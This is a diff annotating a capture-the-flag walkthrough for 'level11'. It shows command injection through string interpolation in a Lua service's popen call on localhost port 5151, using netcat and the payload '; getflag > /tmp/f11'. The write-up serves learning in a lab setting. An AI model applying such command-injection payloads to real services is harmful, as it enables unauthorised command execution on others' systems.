@@ -1,5 +1,14 @@
+ # method: command injection
+ # exploited function: strin interpolation in popen - execute command and save it to use it later with other function
  cat level11.lua
- nc -zv localhost 5151
- nc localhost 5151
-     ; getflag > /tmp/f11
+ nc -zv localhost 5151 # scan if port is open
+ nc localhost 5151 # create TCP connection
+    ; getflag > /tmp/f11 # send in password
  cat /tmp/f11
+
+# netcat - read and writes data across network connections uscing TCP or UDP
+# -z - port scanning (no data connection or transfering, just report open or runnimg ports)
+# -v - verbose
+
+# programm checks the password with argument -> programm echo the password in popen
+# -> instead of password send getflag as argument
